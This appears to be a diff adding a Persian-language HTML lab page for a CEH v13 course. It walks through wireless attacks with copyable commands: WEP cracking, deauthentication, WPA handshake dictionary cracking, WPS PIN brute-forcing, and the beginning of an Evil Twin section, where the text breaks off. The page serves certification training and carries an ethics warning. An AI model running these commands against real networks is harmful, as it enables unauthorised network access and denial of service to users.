@@ -1,0 +1,898 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>آزمایشگاه: Session 3 Wireless Hacking - دوره CEH V13</title>
+    <link rel="stylesheet" href="../../style.css">
+    <style>
+        .step-card {
+            background: white;
+            padding: 20px 25px;
+            border-radius: 12px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+            margin-bottom: 20px;
+            border-right: 4px solid #2a7de1;
+        }
+        .step-card h3 {
+            margin-top: 0;
+            color: #0b3b5c;
+            border-bottom: none;
+            font-size: 1.2rem;
+        }
+        .step-card .badge {
+            display: inline-block;
+            background: #e8f0fe;
+            color: #2a7de1;
+            padding: 2px 12px;
+            border-radius: 12px;
+            font-size: 0.75rem;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+        .step-card .phase-badge {
+            display: inline-block;
+            padding: 3px 14px;
+            border-radius: 20px;
+            font-size: 0.75rem;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+        .phase-scan { background: #cce5ff; color: #004085; }
+        .phase-attack { background: #fff3cd; color: #856404; }
+        .phase-exploit { background: #f8d7da; color: #721c24; }
+        .phase-post { background: #d1ecf1; color: #0c5460; }
+        .phase-crack { background: #d4edda; color: #155724; }
+
+        .warning-box {
+            background: #fef0e8;
+            border-right: 4px solid #e74c3c;
+            padding: 12px 16px;
+            border-radius: 8px;
+            margin: 12px 0;
+            font-size: 0.95rem;
+        }
+        .tip-box {
+            background: #e8fef0;
+            border-right: 4px solid #27ae60;
+            padding: 12px 16px;
+            border-radius: 8px;
+            margin: 12px 0;
+            font-size: 0.95rem;
+        }
+        .info-box {
+            background: #e8f0fe;
+            border-right: 4px solid #2a7de1;
+            padding: 12px 16px;
+            border-radius: 8px;
+            margin: 12px 0;
+            font-size: 0.95rem;
+        }
+        .highlight-box {
+            background: #e8f0fe;
+            border-right: 6px solid #ff9f1c;
+            padding: 18px 24px;
+            border-radius: 12px;
+            margin: 22px 0 10px 0;
+        }
+        .code-block {
+            position: relative;
+            background: #1e2a3a;
+            padding: 15px;
+            border-radius: 10px;
+            overflow-x: auto;
+            margin: 12px 0;
+            border-left: 4px solid #2a7de1;
+        }
+        .code-block code {
+            background: transparent;
+            border: none;
+            color: #e4eef7;
+            padding: 0;
+            font-size: 0.92rem;
+            font-family: 'Courier New', monospace;
+            white-space: pre-wrap;
+            word-break: break-word;
+        }
+        .copy-btn {
+            background: #4a5a7a;
+            color: white;
+            border: none;
+            padding: 4px 14px;
+            border-radius: 6px;
+            font-size: 0.75rem;
+            cursor: pointer;
+            float: left;
+            transition: background 0.2s;
+            font-weight: 600;
+        }
+        .copy-btn:hover {
+            background: #2a7de1;
+        }
+        .output-box {
+            background: #1a2a3a;
+            color: #b6d4f0;
+            padding: 12px 16px;
+            border-radius: 8px;
+            margin: 10px 0;
+            font-family: 'Courier New', monospace;
+            font-size: 0.88rem;
+            border-right: 3px solid #4a8a5a;
+            overflow-x: auto;
+        }
+        .output-box .highlight-text { color: #f0c060; }
+        .output-box .success-text { color: #7ddf9a; }
+        .output-box .error-text { color: #f08080; }
+
+        .tools-used {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            margin: 10px 0;
+        }
+        .tools-used .tool-tag {
+            background: #1e2a3a;
+            color: #e4eef7;
+            padding: 4px 14px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            font-family: 'Courier New', monospace;
+            border: 1px solid #3a4a5a;
+        }
+        .tools-used .tool-tag.primary { border-color: #2a7de1; }
+        .tools-used .tool-tag.success { border-color: #27ae60; }
+        .tools-used .tool-tag.warning { border-color: #f39c12; }
+        .tools-used .tool-tag.danger { border-color: #e74c3c; }
+        .tools-used .tool-tag.info { border-color: #2a7de1; }
+
+        .question-box {
+            background: #f8f9fa;
+            border-right: 4px solid #6c757d;
+            padding: 15px 20px;
+            border-radius: 8px;
+            margin: 15px 0;
+        }
+        .question-box strong {
+            color: #0b3b5c;
+        }
+        .security-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 15px 0;
+            font-size: 0.95rem;
+        }
+        .security-table th {
+            background: #1e3a5f;
+            color: white;
+            padding: 10px 15px;
+            text-align: right;
+        }
+        .security-table td {
+            padding: 10px 15px;
+            border-bottom: 1px solid #e8edf4;
+        }
+        .security-table tr:hover {
+            background: #f1f6fa;
+        }
+        .security-table .insecure { color: #e74c3c; font-weight: 700; }
+        .security-table .secure { color: #27ae60; font-weight: 700; }
+        .security-table .warning { color: #f39c12; font-weight: 700; }
+
+        @media (max-width: 768px) {
+            .step-card {
+                padding: 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ===== نوار ناوبری ===== -->
+    <div class="nav-bar">
+        <span dir='ltr'>📘 CEH V13</span>
+        <span dir='ltr'>
+            <a href="../index.html">خانه</a> |
+            <a href="../index.html">آزمایشگاه‌ها</a>
+        </span>
+    </div>
+
+    <h1>📶 آزمایشگاه: Wireless Hacking</h1>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۱: معرفی -->
+    <!-- ============================================================ -->
+    <div class="card">
+        <h2>🔰 معرفی آزمایشگاه</h2>
+        <p>
+            <b>هک شبکه‌های بی‌سیم (Wireless Hacking)</b> یکی از جذاب‌ترین و کاربردی‌ترین حوزه‌های امنیت سایبری است. با افزایش استفاده از شبکه‌های وای‌فای در خانه‌ها، ادارات و فضاهای عمومی، امنیت این شبکه‌ها به یک چالش جدی تبدیل شده است.
+        </p>
+        <p>
+            در این آزمایشگاه، شما با <b>ابزارهای اصلی هک وای‌فای</b> در Kali Linux آشنا خواهید شد و حملات مختلف را بر روی شبکه‌های آزمایشگاهی پیاده‌سازی می‌کنید. از <b>شکستن WEP</b> گرفته تا <b>کرک WPA/WPA2</b> و <b>حمله Evil Twin</b>.
+        </p>
+
+        <div class="info-box">
+            <b>🎯 اهداف این آزمایشگاه:</b>
+            <ul>
+                <li>آشنایی با پروتکل‌های امنیتی وای‌فای (WEP, WPA, WPA2, WPA3)</li>
+                <li>کار با مجموعه ابزارهای Aircrack-ng</li>
+                <li>شکستن رمز WEP با جمع‌آوری IV</li>
+                <li>ضبط Handshake و کرک WPA/WPA2 با دیکشنری</li>
+                <li>حمله به WPS با Reaver و Bully</li>
+                <li>اجرای حمله Evil Twin و Deauthentication</li>
+                <li>شناسایی و مقابله با حملات بی‌سیم</li>
+            </ul>
+        </div>
+
+        <div class="warning-box">
+            <b>⚠️ هشدار اخلاقی بسیار مهم!</b>
+            <p>
+                تمام تمرینات این آزمایشگاه فقط در <b>شبکه‌های خودتان</b> یا با <b>مجوز کتبی</b> از صاحب شبکه انجام شوند.
+                هک شبکه‌های دیگران بدون مجوز <b>جرم</b> است و در بسیاری از کشورها مجازات سنگینی دارد.
+            </p>
+        </div>
+
+        <div class="tip-box">
+            <b>🖥️ نیازمندی‌های سخت‌افزاری:</b>
+            <ul>
+                <li>یک <b>کارت شبکه بی‌سیم</b> که از حالت Monitor پشتیبانی کند (مثل Alfa AWUS036ACH, Atheros AR9271).</li>
+                <li>یک <b>روتر یا Access Point</b> آزمایشگاهی با قابلیت تغییر تنظیمات امنیتی.</li>
+                <li>Kali Linux (روی ماشین مجازی یا فیزیکی).</li>
+            </ul>
+            <div class="info-box">
+                <b>📌 نکته:</b> کارت‌های شبکه داخلی لپ‌تاپ معمولاً از Monitor Mode پشتیبانی نمی‌کنند. یک کارت USB خارجی تهیه کنید.
+            </div>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۲: مفاهیم پایه وای‌فای -->
+    <!-- ============================================================ -->
+    <div class="card">
+        <h2>📡 مفاهیم پایه شبکه‌های بی‌سیم</h2>
+
+        <h3>📌 پروتکل‌های امنیتی وای‌فای</h3>
+        <div class="table-responsive">
+            <table class="security-table">
+                <tr><th>پروتکل</th><th>سال معرفی</th><th>رمزنگاری</th><th>وضعیت امنیت</th></tr>
+                <tr><td>WEP</td><td>۱۹۹۹</td><td>RC4</td><td><span dir='ltr' class="insecure">❌ کاملاً ناامن</span></td></tr>
+                <tr><td>WPA</td><td>۲۰۰۳</td><td>TKIP (با RC4)</td><td><span dir='ltr' class="warning">⚠️ آسیب‌پذیر</span></td></tr>
+                <tr><td>WPA2</td><td>۲۰۰۴</td><td>AES-CCMP</td><td><span dir='ltr' class="secure">✅ امن (با رمز قوی)</span></td></tr>
+                <tr><td>WPA3</td><td>۲۰۱۸</td><td>GCMP-256 (AES)</td><td><span dir='ltr' class="secure">✅ امن‌ترین</span></td></tr>
+            </table>
+        </div>
+
+        <h3>📌 اصطلاحات کلیدی</h3>
+        <ul>
+            <li><b>SSID:</b> نام شبکه وای‌فای که کاربران می‌بینند.</li>
+            <li><b>BSSID:</b> آدرس MAC Access Point.</li>
+            <li><b>Channel:</b> فرکانس کاری شبکه (۱ تا ۱۱ در باند ۲.۴ گیگاهرتز).</li>
+            <li><b>WPA Handshake:</b> فرآیند دست‌دادن بین کلاینت و AP که برای کرک WPA/WPA2 ضروری است.</li>
+            <li><b>IV (Initialization Vector):</b> برای کرک WEP استفاده می‌شود.</li>
+        </ul>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۳: راه‌اندازی کارت شبکه -->
+    <!-- ============================================================ -->
+    <div class="card">
+        <h2>⚙️ مرحله ۱: راه‌اندازی کارت شبکه بی‌سیم</h2>
+
+        <div class="step-card">
+            <span dir='ltr' class="badge">گام ۱</span>
+            <span dir='ltr' class="phase-badge phase-scan">راه‌اندازی</span>
+            <h3>شناسایی کارت شبکه</h3>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir='ltr'><code dir='ltr'>iwconfig
+# یا
+sudo airmon-ng</code></pre>
+            </div>
+            <div class="output-box">
+                <span dir='ltr' class="highlight-text">lo        no wireless extensions.</span><br>
+                <span dir='ltr' class="highlight-text">eth0      no wireless extensions.</span><br>
+                <span dir='ltr' class="success-text">wlan0     IEEE 802.11  ESSID:off/any</span><br>
+                <span dir='ltr' class="success-text">          Mode:Managed  Access Point: Not-Associated</span>
+            </div>
+            <div class="tip-box">
+                <b>💡 توضیح:</b> کارت شبکه شما معمولاً <code dir='ltr'>wlan0</code> یا <code dir='ltr'>wlan1</code> نام دارد. این نام را در طول آزمایشگاه به خاطر داشته باشید.
+            </div>
+        </div>
+
+        <div class="step-card">
+            <span dir='ltr' class="badge">گام ۲</span>
+            <span dir='ltr' class="phase-badge phase-scan">راه‌اندازی</span>
+            <h3>قرار دادن کارت در حالت Monitor</h3>
+            <p>حالت Monitor به کارت شبکه اجازه می‌دهد تمام بسته‌های موجود در هوا را ضبط کند.</p>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir='ltr'><code dir='ltr'>sudo airmon-ng start wlan0</code></pre>
+            </div>
+            <div class="output-box">
+                <span dir='ltr' class="success-text">Found 1 processes that could cause trouble.</span><br>
+                <span dir='ltr' class="highlight-text">Killing them using PID:</span><br>
+                <span dir='ltr' class="success-text">PHY	Interface	Driver		Chipset</span><br>
+                <span dir='ltr' class="success-text">phy0	wlan0		ath9k_htc	Qualcomm Atheros Communications AR9271</span><br>
+                <span dir='ltr' class="success-text">		(mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)</span><br>
+                <span dir='ltr' class="success-text">		(mac80211 station mode vif disabled for [phy0]wlan0)</span>
+            </div>
+            <div class="tip-box">
+                <b>💡 نکته:</b> پس از اجرا، یک رابط جدید به نام <code dir='ltr'>wlan0mon</code> (یا <code dir='ltr'>wlan1mon</code>) ایجاد می‌شود. از این به بعد از این رابط استفاده کنید.
+            </div>
+        </div>
+
+        <div class="step-card">
+            <span dir='ltr' class="badge">گام ۳</span>
+            <span dir='ltr' class="phase-badge phase-scan">راه‌اندازی</span>
+            <h3>بررسی وضعیت</h3>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir='ltr'><code dir='ltr'>sudo airmon-ng check
+iwconfig wlan0mon</code></pre>
+            </div>
+            <div class="output-box">
+                <span dir='ltr' class="success-text">wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.412 GHz  Tx-Power=20 dBm</span><br>
+                <span dir='ltr' class="success-text">          Retry short limit:7   RTS thr:off   Fragment thr:off</span><br>
+                <span dir='ltr' class="success-text">          Power Management:off</span>
+            </div>
+            <div class="highlight-box">
+                <b>✅ موفقیت!</b>
+                <p>
+                    کارت شبکه شما در حالت Monitor قرار گرفته و آماده اسکن و حمله است.
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۴: اسکن شبکه‌های بی‌سیم -->
+    <!-- ============================================================ -->
+    <div class="card">
+        <h2>🔍 مرحله ۲: اسکن شبکه‌های بی‌سیم</h2>
+
+        <div class="step-card">
+            <span dir='ltr' class="badge">گام ۱</span>
+            <span dir='ltr' class="phase-badge phase-scan">اسکن</span>
+            <h3>اسکن با airodump-ng</h3>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir='ltr'><code dir='ltr'>sudo airodump-ng wlan0mon</code></pre>
+            </div>
+            <div class="output-box">
+                <span dir='ltr' class="highlight-text"> CH  9 ][ Elapsed: 12 s ][ 2024-01-20 14:23 </span><br>
+                <span dir='ltr' class="highlight-text"> BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID</span><br>
+                <span dir='ltr' class="success-text"> 00:11:22:33:44:55  -35  124        0    0    1  54   WPA2 CCMP   PSK  MyHomeWiFi</span><br>
+                <span dir='ltr' class="success-text"> AA:BB:CC:DD:EE:FF  -42  89         5    0    6  54   WPA2 CCMP   PSK  Office_5G</span><br>
+                <span dir='ltr' class="warning-text"> 11:22:33:44:55:66  -60  45         0    0    11  54   WEP  WEP    OPN  old_network</span><br>
+                <span dir='ltr' class="success-text"> 22:33:44:55:66:77  -55  220        3    0    3  54   OPN  —      —    Free_WiFi</span>
+            </div>
+            <div class="info-box">
+                <b>📌 تحلیل نتایج:</b>
+                <ul>
+                    <li><span dir='ltr' class="success-text">WPA2 CCMP</span> – امن‌ترین نوع رمزنگاری فعلی</li>
+                    <li><span dir='ltr' class="warning-text">WEP</span> – بسیار ناامن، قابل شکستن در چند دقیقه</li>
+                    <li><span dir='ltr' class="success-text">OPN</span> – بدون رمز (Open)</li>
+                    <li>به <b>BSSID</b> (آدرس MAC)، <b>CH</b> (کانال) و <b>ESSID</b> (نام شبکه) دقت کنید.</li>
+                </ul>
+            </div>
+            <div class="tip-box">
+                <b>💡 نکته:</b> برای خروج از airodump-ng، کلید <b>Ctrl+C</b> را بزنید.
+            </div>
+        </div>
+
+        <div class="step-card">
+            <span dir='ltr' class="badge">گام ۲</span>
+            <span dir='ltr' class="phase-badge phase-scan">اسکن</span>
+            <h3>اسکن هدفمند برای جمع‌آوری بسته‌ها</h3>
+            <p>برای حمله به یک شبکه خاص، باید روی کانال آن متمرکز شوید و بسته‌ها را ذخیره کنید.</p>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir='ltr'><code dir='ltr'>sudo airodump-ng -c [CHANNEL] --bssid [BSSID] -w capture wlan0mon</code></pre>
+            </div>
+            <p><b>مثال:</b></p>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir='ltr'><code dir='ltr'>sudo airodump-ng -c 1 --bssid 00:11:22:33:44:55 -w capture wlan0mon</code></pre>
+            </div>
+            <div class="info-box">
+                <b>📌 توضیح گزینه‌ها:</b>
+                <ul>
+                    <li><code dir='ltr'>-c</code> – کانال شبکه هدف</li>
+                    <li><code dir='ltr'>--bssid</code> – آدرس MAC Access Point</li>
+                    <li><code dir='ltr'>-w</code> – نام فایل برای ذخیره بسته‌ها (capture-01.cap, capture-02.cap, …)</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۵: کرک WEP -->
+    <!-- ============================================================ -->
+    <div class="card">
+        <h2>🔴 سناریو ۱: کرک WEP</h2>
+        <p>
+            <b>WEP</b> قدیمی‌ترین و ناامن‌ترین پروتکل امنیتی وای‌فای است. به دلیل ضعف در الگوریتم RC4 و استفاده از IV کوتاه (۲۴ بیت)، به راحتی قابل شکستن است.
+        </p>
+
+        <div class="step-card">
+            <span dir='ltr' class="badge">گام ۱</span>
+            <span dir='ltr' class="phase-badge phase-scan">اسکن</span>
+            <h3>یافتن یک شبکه WEP</h3>
+            <p>با <code dir='ltr'>airodump-ng</code> یک شبکه با رمزنگاری <span dir='ltr' class="warning-text">WEP</span> پیدا کنید.</p>
+            <div class="output-box">
+                <span dir='ltr' class="highlight-text">BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID</span><br>
+                <span dir='ltr' class="warning-text">11:22:33:44:55:66  -60  45         0    0    11  54   WEP  WEP    OPN  WEP_Network</span>
+            </div>
+            <div class="tip-box">
+                <b>💡 نکته:</b> برای کرک WEP به حداقل <b>۴۰,۰۰۰ تا ۸۰,۰۰۰</b> بسته IV (Initialization Vector) نیاز دارید.
+            </div>
+        </div>
+
+        <div class="step-card">
+            <span dir='ltr' class="badge">گام ۲</span>
+            <span dir='ltr' class="phase-badge phase-attack">حمله</span>
+            <h3>جمع‌آوری بسته‌های IV</h3>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir='ltr'><code dir='ltr'>sudo airodump-ng -c 11 --bssid 11:22:33:44:55:66 -w wep_capture wlan0mon</code></pre>
+            </div>
+            <p>در یک ترمینال دیگر، برای افزایش ترافیک و تولید IV بیشتر، از <code dir='ltr'>aireplay-ng</code> استفاده کنید:</p>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir='ltr'><code dir='ltr'>sudo aireplay-ng -3 -b 11:22:33:44:55:66 -h [YOUR_MAC] wlan0mon</code></pre>
+            </div>
+            <p><b>برای پیدا کردن MAC خود:</b></p>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir='ltr'><code dir='ltr'>macchanger -s wlan0mon</code></pre>
+            </div>
+            <div class="info-box">
+                <b>📌 توضیح:</b> گزینه <code dir='ltr'>-3</code> در aireplay-ng یک حمله ARP Replay است که بسته‌های ARP را دوباره ارسال می‌کند و باعث تولید IV بیشتر می‌شود.
+            </div>
+        </div>
+
+        <div class="step-card">
+            <span dir='ltr' class="badge">گام ۳</span>
+            <span dir='ltr' class="phase-badge phase-crack">کرک</span>
+            <h3>شکستن کلید WEP</h3>
+            <p>پس از جمع‌آوری بسته‌های کافی (حدود ۴۰,۰۰۰ IV)، از <code dir='ltr'>aircrack-ng</code> برای کرک استفاده کنید.</p>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir='ltr'><code dir='ltr'>sudo aircrack-ng wep_capture-01.cap</code></pre>
+            </div>
+            <div class="output-box">
+                <span dir='ltr' class="highlight-text">Opening wep_capture-01.cap</span><br>
+                <span dir='ltr' class="highlight-text">Read 32456 packets.</span><br>
+                <span dir='ltr' class="highlight-text">#  BSSID           ESSID                     Encryption</span><br>
+                <span dir='ltr' class="success-text">1  11:22:33:44:55:66  WEP_Network               WEP (106 IV)</span><br>
+                <span dir='ltr' class="highlight-text">Choosing first network as target.</span><br>
+                <span dir='ltr' class="highlight-text">Opening wep_capture-01.cap</span><br>
+                <span dir='ltr' class="highlight-text">Attack will be restarted every 5000 captured IVs.</span><br>
+                <span dir='ltr' class="highlight-text">Starting PTW attack with 106 IVs.</span><br>
+                <span dir='ltr' class="success-text">KEY FOUND! [ 12:34:56:78:9A:BC ]</span><br>
+                <span dir='ltr' class="success-text">Decrypted correctly: 100%</span>
+            </div>
+            <div class="highlight-box">
+                <b>🎉 موفقیت!</b>
+                <p>
+                    کلید WEP با موفقیت پیدا شد. این کلید را می‌توانید برای اتصال به شبکه استفاده کنید.
+                </p>
+            </div>
+            <div class="warning-box">
+                <b>⚠️ نکته:</b> اگر IV کافی جمع‌آوری نشده باشد، پیغام <span dir='ltr' class="error-text">"Failed to crack WEP key"</span> نمایش داده می‌شود. به جمع‌آوری بسته‌ها ادامه دهید.
+            </div>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۶: کرک WPA/WPA2 -->
+    <!-- ============================================================ -->
+    <div class="card">
+        <h2>🟡 سناریو ۲: کرک WPA/WPA2</h2>
+        <p>
+            <b>WPA/WPA2</b> امن‌تر از WEP است و کرک آن نیاز به <b>ضبط Handshake</b> و یک <b>دیکشنری</b> مناسب دارد. قدرت رمز عبور تعیین‌کننده موفقیت است.
+        </p>
+
+        <div class="step-card">
+            <span dir='ltr' class="badge">گام ۱</span>
+            <span dir='ltr' class="phase-badge phase-scan">اسکن</span>
+            <h3>یافتن یک شبکه WPA/WPA2</h3>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir='ltr'><code dir='ltr'>sudo airodump-ng wlan0mon</code></pre>
+            </div>
+            <div class="output-box">
+                <span dir='ltr' class="highlight-text">BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID</span><br>
+                <span dir='ltr' class="success-text">00:11:22:33:44:55  -35  124        0    0    1  54   WPA2 CCMP   PSK  MyHomeWiFi</span>
+            </div>
+        </div>
+
+        <div class="step-card">
+            <span dir='ltr' class="badge">گام ۲</span>
+            <span dir='ltr' class="phase-badge phase-scan">اسکن</span>
+            <h3>جمع‌آوری Handshake</h3>
+            <p>با <code dir='ltr'>airodump-ng</code> روی کانال هدف متمرکز شوید و منتظر Handshake باشید.</p>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir='ltr'><code dir='ltr'>sudo airodump-ng -c 1 --bssid 00:11:22:33:44:55 -w wpa_capture wlan0mon</code></pre>
+            </div>
+            <p>در یک ترمینال دیگر، برای دریافت Handshake، یک حمله Deauth اجرا کنید:</p>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir='ltr'><code dir='ltr'>sudo aireplay-ng -0 5 -a 00:11:22:33:44:55 wlan0mon</code></pre>
+            </div>
+            <div class="output-box">
+                <span dir='ltr' class="success-text">CH  1 ][ Elapsed: 45 s ][ 2024-01-20 14:45 </span><br>
+                <span dir='ltr' class="highlight-text">BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID</span><br>
+                <span dir='ltr' class="success-text">00:11:22:33:44:55  -35  124        0    0    1  54   WPA2 CCMP   PSK  MyHomeWiFi</span><br>
+                <span dir='ltr' class="highlight-text">BSSID              STATION            PWR   Rate   Lost  Frames  Notes  Probes</span><br>
+                <span dir='ltr' class="success-text">00:11:22:33:44:55  AA:BB:CC:DD:EE:FF  -40   54-54   0     12      EAPOL</span>
+            </div>
+            <div class="info-box">
+                <b>📌 نکته:</b> وقتی <span dir='ltr' class="success-text">EAPOL</span> در ستون Notes ظاهر شود، یعنی Handshake با موفقیت ضبط شده است.
+            </div>
+        </div>
+
+        <div class="step-card">
+            <span dir='ltr' class="badge">گام ۳</span>
+            <span dir='ltr' class="phase-badge phase-crack">کرک</span>
+            <h3>کرک با دیکشنری</h3>
+            <p>با استفاده از <code dir='ltr'>aircrack-ng</code> و یک دیکشنری مانند <code dir='ltr'>rockyou.txt</code>، رمز را پیدا کنید.</p>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir='ltr'><code dir='ltr'>sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt wpa_capture-01.cap</code></pre>
+            </div>
+            <div class="output-box">
+                <span dir='ltr' class="highlight-text">Opening wpa_capture-01.cap</span><br>
+                <span dir='ltr' class="highlight-text">Read 456 packets.</span><br>
+                <span dir='ltr' class="highlight-text">#  BSSID           ESSID                     Encryption</span><br>
+                <span dir='ltr' class="success-text">1  00:11:22:33:44:55  MyHomeWiFi               WPA (1 handshake)</span><br>
+                <span dir='ltr' class="highlight-text">Choosing first network as target.</span><br>
+                <span dir='ltr' class="highlight-text">Opening wpa_capture-01.cap</span><br>
+                <span dir='ltr' class="highlight-text">Attack will be restarted every 5000 captured IVs.</span><br>
+                <span dir='ltr' class="highlight-text">Starting PTW attack with 106 IVs.</span><br>
+                <span dir='ltr' class="success-text">KEY FOUND! [ password123 ]</span>
+            </div>
+            <div class="highlight-box">
+                <b>🎉 موفقیت!</b>
+                <p>
+                    رمز WPA/WPA2 با موفقیت پیدا شد. این رمز را می‌توانید برای اتصال به شبکه استفاده کنید.
+                </p>
+            </div>
+            <div class="warning-box">
+                <b>⚠️ نکته مهم:</b> اگر رمز قوی باشد (مثل <code dir='ltr'>MyC0mpl3xP@ssw0rd!</code>)، ممکن است روزها یا سال‌ها طول بکشد. قدرت رمز عبور مهم‌ترین عامل است.
+            </div>
+            <div class="tip-box">
+                <b>💡 نکته:</b> برای کرک سریع‌تر، از <code dir='ltr'>hashcat</code> با GPU استفاده کنید:
+                <div class="code-block">
+                    <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                    <pre dir='ltr'><code dir='ltr'>cap2hccapx wpa_capture-01.cap wpa.hccapx
+hashcat -m 2500 wpa.hccapx /usr/share/wordlists/rockyou.txt</code></pre>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۷: حمله به WPS -->
+    <!-- ============================================================ -->
+    <div class="card">
+        <h2>🔑 سناریو ۳: حمله به WPS (Wi-Fi Protected Setup)</h2>
+        <p>
+            <b>WPS</b> یک ویژگی برای اتصال آسان دستگاه‌ها به شبکه است که از یک PIN ۸ رقمی استفاده می‌کند. این PIN به دلیل طراحی ضعیف، به راحتی قابل Brute-Force است.
+        </p>
+
+        <div class="step-card">
+            <span dir='ltr' class="badge">گام ۱</span>
+            <span dir='ltr' class="phase-badge phase-scan">اسکن</span>
+            <h3>یافتن شبکه‌های با WPS فعال</h3>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir='ltr'><code dir='ltr'>sudo wash -i wlan0mon</code></pre>
+            </div>
+            <div class="output-box">
+                <span dir='ltr' class="highlight-text">BSSID              Channel  RSSI  WPS Version  WPS Locked  ESSID</span><br>
+                <span dir='ltr' class="success-text">00:11:22:33:44:55  1        -35   1.0          No          MyHomeWiFi</span><br>
+                <span dir='ltr' class="success-text">AA:BB:CC:DD:EE:FF  6        -42   2.0          No          Office_5G</span>
+            </div>
+            <div class="tip-box">
+                <b>💡 نکته:</b> <span dir='ltr' class="success-text">WPS Locked: No</span> یعنی WPS فعال است و قفل نشده است.
+            </div>
+        </div>
+
+        <div class="step-card">
+            <span dir='ltr' class="badge">گام ۲</span>
+            <span dir='ltr' class="phase-badge phase-attack">حمله</span>
+            <h3>Brute-Force PIN با Reaver</h3>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir='ltr'><code dir='ltr'>sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 1 -v</code></pre>
+            </div>
+            <div class="output-box">
+                <span dir='ltr' class="success-text">[+] Waiting for beacon from 00:11:22:33:44:55</span><br>
+                <span dir='ltr' class="success-text">[+] Associated with 00:11:22:33:44:55 (ESSID: MyHomeWiFi)</span><br>
+                <span dir='ltr' class="success-text">[+] Starting Cracking Session. Pin count: 0, Max pin attempts: 11000</span><br>
+                <span dir='ltr' class="success-text">[+] Trying pin 12345670</span><br>
+                <span dir='ltr' class="success-text">[+] Trying pin 12345671</span><br>
+                <span dir='ltr' class="success-text">[+] Trying pin 12345672</span><br>
+                <span dir='ltr' class="success-text">[+] Pin found: 12345678</span><br>
+                <span dir='ltr' class="success-text">[+] WPS PIN: 12345678</span><br>
+                <span dir='ltr' class="success-text">[+] WPA PSK: MySecretPassword</span>
+            </div>
+            <div class="highlight-box">
+                <b>🎉 موفقیت!</b>
+                <p>
+                    PIN WPS و رمز WPA پیدا شد. با این اطلاعات می‌توانید به شبکه متصل شوید.
+                </p>
+            </div>
+            <div class="warning-box">
+                <b>⚠️ هشدار:</b> حملات Reaver ممکن است ساعت‌ها طول بکشند و اگر روتر قفل WPS را فعال کند، حمله ناموفق خواهد بود.
+            </div>
+            <div class="tip-box">
+                <b>💡 نکته:</b> برای افزایش سرعت، از <code dir='ltr'>bully</code> (جایگزین سریع‌تر Reaver) استفاده کنید:
+                <div class="code-block">
+                    <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                    <pre dir='ltr'><code dir='ltr'>sudo bully wlan0mon -b 00:11:22:33:44:55 -c 1 -v</code></pre>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۸: حمله Evil Twin -->
+    <!-- ============================================================ -->
+    <div class="card">
+        <h2>🎭 سناریو ۴: حمله Evil Twin</h2>
+        <p>
+            <b>Evil Twin</b> یک حمله MITM است که در آن مهاجم یک Access Point جعلی با همان SSID شبکه اصلی ایجاد می‌کند. کاربران به‌اشتباه به آن متصل می‌شوند و مهاجم می‌تواند ترافیک آنها را شنود کند.
+        </p>
+
+        <div class="step-card">
+            <span dir='ltr' class="badge">گام ۱</span>
+            <span dir='ltr' class="phase-badge phase-scan">اسکن</span>
+            <h3>شناسایی شبکه هدف</h3>
+            <div class="code-block">
